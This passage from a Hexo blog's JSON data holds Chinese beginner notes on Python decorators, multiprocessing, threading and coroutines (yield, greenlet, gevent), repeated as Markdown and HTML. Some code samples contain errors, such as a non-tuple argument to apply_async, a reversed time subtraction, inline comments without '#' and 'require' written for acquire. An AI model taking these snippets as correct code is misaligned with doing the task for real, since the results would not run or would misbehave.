说明:装饰器的闭包中，外部函数用来接收函数，内部函数用来接收函数的参数，并且在没有调用函数之前只要有@就开始装饰,在装饰不定长的函数时\n\n```python\ndef test(x,*args,**kwargs):\n    print(\"test\")\n```\n \n- 这种函数的装饰器的内部函数参数定义为(*args, **kwargs)就可以了，这种装饰器叫做通用装饰器,遇到有返回值的函数的时候，装饰器的内部函数也要有return，格式:return 函数（参数）\n\n\n\n### 装饰器带参数\n> 带参数的装饰器:@装饰器名称(参数)\n\n```python\ndef 第一层(参数):                        # 第一层用来保存装饰器的参数\n    def 第二层(函数):                    # 第二层用来保存被装的函数\n        def 第三层(函数的参数):           # 第三层用来保存被装函数的参数，并且进行装饰函数，并且使用第一层保存的装饰器参数\n            语句块\n            [return] 函数\n        return 第三层\n    return 第二层\n  ```\n\n> 多个装饰器对同一个函数装饰:装饰的时候最下面的开始装,从下往上装\n\n\n### 类装饰器\n> 基本构架\n\n```python\nclass Tt():\n    def __init__(self, func):\n        self.func = func\n\n    def __call__(self,[*args,**kwargs]):\n        代码\n        [return] self.func\n\n@Tt     #还可以点出更多东西以后会学到\ndef test():\n    return \"haha\"\n\ntest()\n```","slug":"python装饰器","published":1,"updated":"2023-03-10T02:52:58.476Z","_id":"cld2uqf6k000l1svkargs8pjk","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"装饰器\"><a href=\"#装饰器\" class=\"headerlink\" title=\"装饰器\"></a>装饰器</h2><blockquote>\n<p>原理:将一个函数的引用传递到另一个闭包里面去</p>\n</blockquote>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">func_set</span><span class=\"token punctuation\">(</span>func<span class=\"token punctuation\">(</span>函数<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">func_start</span><span class=\"token punctuation\">(</span>参数<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"验证一\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"验证二\"</span><span class=\"token punctuation\">)</span>\n        func<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> func_start<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>使用方法一</p>\n</blockquote>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token decorator annotation punctuation\">@func_set</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span>参数<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"test\"</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>使用方法二</p>\n</blockquote>\n <pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">ret <span class=\"token operator\">=</span> func_set<span class=\"token punctuation\">(</span>test<span class=\"token punctuation\">)</span>\nret<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>说明:装饰器的闭包中，外部函数用来接收函数，内部函数用来接收函数的参数，并且在没有调用函数之前只要有@就开始装饰,在装饰不定长的函数时</p>\n</blockquote>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span><span class=\"token operator\">*</span>args<span class=\"token punctuation\">,</span><span class=\"token operator\">**</span>kwargs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"test\"</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<ul>\n<li>这种函数的装饰器的内部函数参数定义为(*args, **kwargs)就可以了，这种装饰器叫做通用装饰器,遇到有返回值的函数的时候，装饰器的内部函数也要有return，格式:return 函数（参数）</li>\n</ul>\n<h3 id=\"装饰器带参数\"><a href=\"#装饰器带参数\" class=\"headerlink\" title=\"装饰器带参数\"></a>装饰器带参数</h3><blockquote>\n<p>带参数的装饰器:@装饰器名称(参数)</p>\n</blockquote>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> 第一层<span class=\"token punctuation\">(</span>参数<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>                        <span class=\"token comment\"># 第一层用来保存装饰器的参数</span>\n    <span class=\"token keyword\">def</span> 第二层<span class=\"token punctuation\">(</span>函数<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>                    <span class=\"token comment\"># 第二层用来保存被装的函数</span>\n        <span class=\"token keyword\">def</span> 第三层<span class=\"token punctuation\">(</span>函数的参数<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>           <span class=\"token comment\"># 第三层用来保存被装函数的参数，并且进行装饰函数，并且使用第一层保存的装饰器参数</span>\n            语句块\n            <span class=\"token punctuation\">[</span><span class=\"token keyword\">return</span><span class=\"token punctuation\">]</span> 函数\n        <span class=\"token keyword\">return</span> 第三层\n    <span class=\"token keyword\">return</span> 第二层<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>多个装饰器对同一个函数装饰:装饰的时候最下面的开始装,从下往上装</p>\n</blockquote>\n<h3 id=\"类装饰器\"><a href=\"#类装饰器\" class=\"headerlink\" title=\"类装饰器\"></a>类装饰器</h3><blockquote>\n<p>基本构架</p>\n</blockquote>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Tt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> func<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>func <span class=\"token operator\">=</span> func\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__call__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span><span class=\"token punctuation\">[</span><span class=\"token operator\">*</span>args<span class=\"token punctuation\">,</span><span class=\"token operator\">**</span>kwargs<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        代码\n        <span class=\"token punctuation\">[</span><span class=\"token keyword\">return</span><span class=\"token punctuation\">]</span> self<span class=\"token punctuation\">.</span>func\n\n<span class=\"token decorator annotation punctuation\">@Tt</span>     <span class=\"token comment\">#还可以点出更多东西以后会学到</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> <span class=\"token string\">\"haha\"</span>\n\ntest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"装饰器\"><a href=\"#装饰器\" class=\"headerlink\" title=\"装饰器\"></a>装饰器</h2><blockquote>\n<p>原理:将一个函数的引用传递到另一个闭包里面去</p>\n</blockquote>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">func_set</span><span class=\"token punctuation\">(</span>func<span class=\"token punctuation\">(</span>函数<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">func_start</span><span class=\"token punctuation\">(</span>参数<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"验证一\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"验证二\"</span><span class=\"token punctuation\">)</span>\n        func<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> func_start<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>使用方法一</p>\n</blockquote>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token decorator annotation punctuation\">@func_set</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span>参数<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"test\"</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>使用方法二</p>\n</blockquote>\n <pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">ret <span class=\"token operator\">=</span> func_set<span class=\"token punctuation\">(</span>test<span class=\"token punctuation\">)</span>\nret<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>说明:装饰器的闭包中，外部函数用来接收函数，内部函数用来接收函数的参数，并且在没有调用函数之前只要有@就开始装饰,在装饰不定长的函数时</p>\n</blockquote>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span><span class=\"token operator\">*</span>args<span class=\"token punctuation\">,</span><span class=\"token operator\">**</span>kwargs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"test\"</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<ul>\n<li>这种函数的装饰器的内部函数参数定义为(*args, **kwargs)就可以了，这种装饰器叫做通用装饰器,遇到有返回值的函数的时候，装饰器的内部函数也要有return，格式:return 函数（参数）</li>\n</ul>\n<h3 id=\"装饰器带参数\"><a href=\"#装饰器带参数\" class=\"headerlink\" title=\"装饰器带参数\"></a>装饰器带参数</h3><blockquote>\n<p>带参数的装饰器:@装饰器名称(参数)</p>\n</blockquote>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> 第一层<span class=\"token punctuation\">(</span>参数<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>                        <span class=\"token comment\"># 第一层用来保存装饰器的参数</span>\n    <span class=\"token keyword\">def</span> 第二层<span class=\"token punctuation\">(</span>函数<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>                    <span class=\"token comment\"># 第二层用来保存被装的函数</span>\n        <span class=\"token keyword\">def</span> 第三层<span class=\"token punctuation\">(</span>函数的参数<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>           <span class=\"token comment\"># 第三层用来保存被装函数的参数，并且进行装饰函数，并且使用第一层保存的装饰器参数</span>\n            语句块\n            <span class=\"token punctuation\">[</span><span class=\"token keyword\">return</span><span class=\"token punctuation\">]</span> 函数\n        <span class=\"token keyword\">return</span> 第三层\n    <span class=\"token keyword\">return</span> 第二层<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>多个装饰器对同一个函数装饰:装饰的时候最下面的开始装,从下往上装</p>\n</blockquote>\n<h3 id=\"类装饰器\"><a href=\"#类装饰器\" class=\"headerlink\" title=\"类装饰器\"></a>类装饰器</h3><blockquote>\n<p>基本构架</p>\n</blockquote>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Tt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> func<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>func <span class=\"token operator\">=</span> func\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__call__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span><span class=\"token punctuation\">[</span><span class=\"token operator\">*</span>args<span class=\"token punctuation\">,</span><span class=\"token operator\">**</span>kwargs<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        代码\n        <span class=\"token punctuation\">[</span><span class=\"token keyword\">return</span><span class=\"token punctuation\">]</span> self<span class=\"token punctuation\">.</span>func\n\n<span class=\"token decorator annotation punctuation\">@Tt</span>     <span class=\"token comment\">#还可以点出更多东西以后会学到</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> <span class=\"token string\">\"haha\"</span>\n\ntest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>"},{"title":"python进程线程协程","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-01-19T06:20:10.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"python进程线程协程实现","_content":"## 进程\n### multiprocessing下面\n- 1、Process:创建一个进程,参数有target，args,args是一个元组作为形式参数\n- 2、start:运行这个进程\n- 3、Queue:是队列，先进先出，和栈相反，Queue(20)就是说可以存放20个数据，数据部分类型。用full来判断是否满，用empty来判断是否空了用put来往里面放数据,用get来拿数据\n- 4、Pool:进程池，实现重复利用，进程任务数量太多或者任务数不确定的时候，最好使用进程池。如果有10000个进程，那么创建一个只有10个任务的进程池，就可以反复一万次来完成任务，避免系统崩溃,利用for循环来创建进程，apply_async(函数，(参数，参数,),创建之后立刻关闭close，并且紧跟其后用join，否则程序死掉'\n\n```python\nfrom multiprocessing import *\nimport time\nimport random\n\ndef info(i):\n    t_start = time.time()\n    time.sleep(random.randrange(1,2)*2)\n    t_stop = time.time()\n    print(f'{i}执行时长:{t_start-t_stop}')\n    \ndef main():\n    p = Pool(3)\n    for i in range(100):\n        p.apply_async(info, (i))\n    p.close()\n    p.join()\n\nif __name__ == \"__main__\":\n    main()\n```\n\n## 线程\n\n### threading下面\n-    1、Thread:创建一个线程对像，可以有两个参数 target= ，args=，args是一个元组\n-    2、start：使用创建的线程\n-    3、enumerate:用来查看有多少个线程在跑，用len来显示个数，用while来控制\n-    4、Lock:互斥锁，可以实例出一个实力对象，require是上锁，release是解锁\n\n> 说明一点:在用c语言编写的python解释器中执行python的线程的时候，会涉及到GIL锁，GIL锁就是同一时刻只有一个程序在执行，这是一种假的多任务，只有线程在有，解决GIL锁的方法\n> - 1、换解释器\n> - 2、换线程语言(因为python基本可以执行其他的所有语言，c、c++、java等)\n\n### 线程共享全局变量\n -   1、如果在线程代码中对全局变量进行修改，要用global,也就是说要令全局变量'等于'一个什么东西的时候必须用global，如：i+=1，用变量的方法来修改的不用使用global，如list.append()\n -   2、如果没有要对全局变量进行修改，就不用global申明，只是使用全局变量也不用使用global\n -   3、全局变量在线程中也可以共享\n -   4、有可能在多线程中可能会出现资源争夺（用Local互斥锁来解决，互斥锁不要太多，用以产生死锁）\n\n### Thread的实例对象还可以是一个类\n -   1、让这个类来继承threading.Thread这个类\n -   2、用的时候直接 对象名 = 这个类（）\n -  3、start的使用：这个类的对象名.start\n -  4、（最重要):这个类中只能进行多线程的就是run函数，所以如果要对类创建多线程，那么必须有run函数，类当中的其他函数只能通过 self.函数名 的形式申明在run函数中\n\n```python\nfrom threading import *\nimport time\n\nclass Prison(Thread):\n\n    def info2(self):\n        print(\"---info2----\")\n\n    def info3(self):\n        print(\"---info3----\")\n\n    def run(self): # 特别重要:只会调用run\n        print(\"---info1----\")\n\ndef main():\n    info = Prison()\n    info.start()\n\nif __name__ == \"__main__\":\n    main() \n```\n\n## 协程\n\n### yield协程\n\n```python\nimport time\ndef info1():\n    while True:\n        print('-----1-----')\n        time.sleep(0.5)\n        yield\ndef info2():\n    while True:\n        print('-----2-----')\n        time.sleep(0.5)\n        yield\ndef main():\n    in1 = info1()\n    in2 = info2()\n    while True:  一定要用循环来切换\n        next(in1)\n        next(in2)\nif __name__ == \"__main__\":\n    main()\n```\n\n### greenlet协程\n```python\nfrom greenlet import *\nimport time\ndef info1():\n    while True:\n        print('-----1-----')\n        t2.switch() 使用greenlet协程必须要使用switch来切换\n        time.sleep(0.5)\ndef info2():\n    while True:\n        print('-----2-----')\n        t1.switch()\n        time.sleep(0.5)\nt1 = greenlet(info1) 创建一个对象\nt2 = greenlet(info2)\nt1.switch() 开始调用\n```\n\n### gevent协程(最大的有点就是利用延时切换任务，充分利用cpu)\n\n```\nimport gevent\ndef f1(n):\n    for i in range(n):\n        print(\"----f1----\", i)\n        gevent.sleep(0.3) # 用于延时，不用time.sleep(),而是用gevent.sleep()\ndef f2(n):\n    for i in range(n):\n        print(\"----f2----\", i)\n        gevent.sleep(0.3)\ndef f3(n):\n    for i in range(n):\n        print(\"----f3----\", i)\n        gevent.sleep(0.3)\ndef main():\n    # 使用方法一、\n    t1 = gevent.spawn(f1, 5)\n    t2 = gevent.spawn(f2, 5)\n    t3 = gevent.spawn(f3, 5)\n    t1.join()\n    t2.join()\n    t3.join()\n\n    # 使用方法二、\n    gevent.joinall([\n        gevent.spawn(f1, 5),\n        gevent.spawn(f2, 5),\n        gevent.spawn(f3, 5)\n    ])\n\n\nif __name__ == \"__main__\":\n    main()\n  ```","source":"_posts/python进程线程协程.md","raw":"---\ntitle: python进程线程协程\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-01-19 14:20:10\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: python进程线程协程实现\ntags: basic\ncategories: Python\n---\n## 进程\n### multiprocessing下面\n- 1、Process:创建一个进程,参数有target，args,args是一个元组作为形式参数\n- 2、start:运行这个进程\n- 3、Queue:是队列，先进先出，和栈相反，Queue(20)就是说可以存放20个数据，数据部分类型。用full来判断是否满，用empty来判断是否空了用put来往里面放数据,用get来拿数据\n- 4、Pool:进程池，实现重复利用，进程任务数量太多或者任务数不确定的时候，最好使用进程池。如果有10000个进程，那么创建一个只有10个任务的进程池，就可以反复一万次来完成任务，避免系统崩溃,利用for循环来创建进程，apply_async(函数，(参数，参数,),创建之后立刻关闭close，并且紧跟其后用join，否则程序死掉'\n\n```python\nfrom multiprocessing import *\nimport time\nimport random\n\ndef info(i):\n    t_start = time.time()\n    time.sleep(random.randrange(1,2)*2)\n    t_stop = time.time()\n    print(f'{i}执行时长:{t_start-t_stop}')\n    \ndef main():\n    p = Pool(3)\n    for i in range(100):\n        p.apply_async(info, (i))\n    p.close()\n    p.join()\n\nif __name__ == \"__main__\":\n    main()\n```\n\n## 线程\n\n### threading下面\n-    1、Thread:创建一个线程对像，可以有两个参数 target= ，args=，args是一个元组\n-    2、start：使用创建的线程\n-    3、enumerate:用来查看有多少个线程在跑，用len来显示个数，用while来控制\n-    4、Lock:互斥锁，可以实例出一个实力对象，require是上锁，release是解锁\n\n> 说明一点:在用c语言编写的python解释器中执行python的线程的时候，会涉及到GIL锁，GIL锁就是同一时刻只有一个程序在执行，这是一种假的多任务，只有线程在有，解决GIL锁的方法\n> - 1、换解释器\n> - 2、换线程语言(因为python基本可以执行其他的所有语言，c、c++、java等)\n\n### 线程共享全局变量\n -   1、如果在线程代码中对全局变量进行修改，要用global,也就是说要令全局变量'等于'一个什么东西的时候必须用global，如：i+=1，用变量的方法来修改的不用使用global，如list.append()\n -   2、如果没有要对全局变量进行修改，就不用global申明，只是使用全局变量也不用使用global\n -   3、全局变量在线程中也可以共享\n -   4、有可能在多线程中可能会出现资源争夺（用Local互斥锁来解决，互斥锁不要太多，用以产生死锁）\n\n### Thread的实例对象还可以是一个类\n -   1、让这个类来继承threading.Thread这个类\n -   2、用的时候直接 对象名 = 这个类（）\n -  3、start的使用：这个类的对象名.start\n -  4、（最重要):这个类中只能进行多线程的就是run函数，所以如果要对类创建多线程，那么必须有run函数，类当中的其他函数只能通过 self.函数名 的形式申明在run函数中\n\n```python\nfrom threading import *\nimport time\n\nclass Prison(Thread):\n\n    def info2(self):\n        print(\"---info2----\")\n\n    def info3(self):\n        print(\"---info3----\")\n\n    def run(self): # 特别重要:只会调用run\n        print(\"---info1----\")\n\ndef main():\n    info = Prison()\n    info.start()\n\nif __name__ == \"__main__\":\n    main() \n```\n\n## 协程\n\n### yield协程\n\n```python\nimport time\ndef info1():\n    while True:\n        print('-----1-----')\n        time.sleep(0.5)\n        yield\ndef info2():\n    while True:\n        print('-----2-----')\n        time.sleep(0.5)\n        yield\ndef main():\n    in1 = info1()\n    in2 = info2()\n    while True:  一定要用循环来切换\n        next(in1)\n        next(in2)\nif __name__ == \"__main__\":\n    main()\n```\n\n### greenlet协程\n```python\nfrom greenlet import *\nimport time\ndef info1():\n    while True:\n        print('-----1-----')\n        t2.switch() 使用greenlet协程必须要使用switch来切换\n        time.sleep(0.5)\ndef info2():\n    while True:\n        print('-----2-----')\n        t1.switch()\n        time.sleep(0.5)\nt1 = greenlet(info1) 创建一个对象\nt2 = greenlet(info2)\nt1.switch() 开始调用\n```\n\n### gevent协程(最大的有点就是利用延时切换任务，充分利用cpu)\n\n```\nimport gevent\ndef f1(n):\n    for i in range(n):\n        print(\"----f1----\", i)\n        gevent.sleep(0.3) # 用于延时，不用time.sleep(),而是用gevent.sleep()\ndef f2(n):\n    for i in range(n):\n        print(\"----f2----\", i)\n        gevent.sleep(0.3)\ndef f3(n):\n    for i in range(n):\n        print(\"----f3----\", i)\n        gevent.sleep(0.3)\ndef main():\n    # 使用方法一、\n    t1 = gevent.spawn(f1, 5)\n    t2 = gevent.spawn(f2, 5)\n    t3 = gevent.spawn(f3, 5)\n    t1.join()\n    t2.join()\n    t3.join()\n\n    # 使用方法二、\n    gevent.joinall([\n        gevent.spawn(f1, 5),\n        gevent.spawn(f2, 5),\n        gevent.spawn(f3, 5)\n    ])\n\n\nif __name__ == \"__main__\":\n    main()\n  ```","slug":"python进程线程协程","published":1,"updated":"2023-03-10T02:53:14.661Z","_id":"cld2uqf6l000n1svk0sejhraj","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"进程\"><a href=\"#进程\" class=\"headerlink\" title=\"进程\"></a>进程</h2><h3 id=\"multiprocessing下面\"><a href=\"#multiprocessing下面\" class=\"headerlink\" title=\"multiprocessing下面\"></a>multiprocessing下面</h3><ul>\n<li>1、Process:创建一个进程,参数有target，args,args是一个元组作为形式参数</li>\n<li>2、start:运行这个进程</li>\n<li>3、Queue:是队列，先进先出，和栈相反，Queue(20)就是说可以存放20个数据，数据部分类型。用full来判断是否满，用empty来判断是否空了用put来往里面放数据,用get来拿数据</li>\n<li>4、Pool:进程池，实现重复利用，进程任务数量太多或者任务数不确定的时候，最好使用进程池。如果有10000个进程，那么创建一个只有10个任务的进程池，就可以反复一万次来完成任务，避免系统崩溃,利用for循环来创建进程，apply_async(函数，(参数，参数,),创建之后立刻关闭close，并且紧跟其后用join，否则程序死掉’</li>\n</ul>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> multiprocessing <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">import</span> time\n<span class=\"token keyword\">import</span> random\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">info</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    t_start <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span>random<span class=\"token punctuation\">.</span>randrange<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    t_stop <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">执行时长:</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>t_start<span class=\"token operator\">-</span>t_stop<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span>\n    \n<span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> Pool<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        p<span class=\"token punctuation\">.</span>apply_async<span class=\"token punctuation\">(</span>info<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    p<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"线程\"><a href=\"#线程\" class=\"headerlink\" title=\"线程\"></a>线程</h2><h3 id=\"threading下面\"><a href=\"#threading下面\" class=\"headerlink\" title=\"threading下面\"></a>threading下面</h3><ul>\n<li>   1、Thread:创建一个线程对像，可以有两个参数 target= ，args=，args是一个元组</li>\n<li>   2、start：使用创建的线程</li>\n<li>   3、enumerate:用来查看有多少个线程在跑，用len来显示个数，用while来控制</li>\n<li>   4、Lock:互斥锁，可以实例出一个实力对象，require是上锁，release是解锁</li>\n</ul>\n<blockquote>\n<p>说明一点:在用c语言编写的python解释器中执行python的线程的时候，会涉及到GIL锁，GIL锁就是同一时刻只有一个程序在执行，这是一种假的多任务，只有线程在有，解决GIL锁的方法</p>\n<ul>\n<li>1、换解释器</li>\n<li>2、换线程语言(因为python基本可以执行其他的所有语言，c、c++、java等)</li>\n</ul>\n</blockquote>\n<h3 id=\"线程共享全局变量\"><a href=\"#线程共享全局变量\" class=\"headerlink\" title=\"线程共享全局变量\"></a>线程共享全局变量</h3><ul>\n<li>  1、如果在线程代码中对全局变量进行修改，要用global,也就是说要令全局变量’等于’一个什么东西的时候必须用global，如：i+=1，用变量的方法来修改的不用使用global，如list.append()</li>\n<li>  2、如果没有要对全局变量进行修改，就不用global申明，只是使用全局变量也不用使用global</li>\n<li>  3、全局变量在线程中也可以共享</li>\n<li>  4、有可能在多线程中可能会出现资源争夺（用Local互斥锁来解决，互斥锁不要太多，用以产生死锁）</li>\n</ul>\n<h3 id=\"Thread的实例对象还可以是一个类\"><a href=\"#Thread的实例对象还可以是一个类\" class=\"headerlink\" title=\"Thread的实例对象还可以是一个类\"></a>Thread的实例对象还可以是一个类</h3><ul>\n<li>  1、让这个类来继承threading.Thread这个类</li>\n<li>  2、用的时候直接 对象名 = 这个类（）</li>\n<li> 3、start的使用：这个类的对象名.start</li>\n<li> 4、（最重要):这个类中只能进行多线程的就是run函数，所以如果要对类创建多线程，那么必须有run函数，类当中的其他函数只能通过 self.函数名 的形式申明在run函数中</li>\n</ul>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> threading <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">import</span> time\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Prison</span><span class=\"token 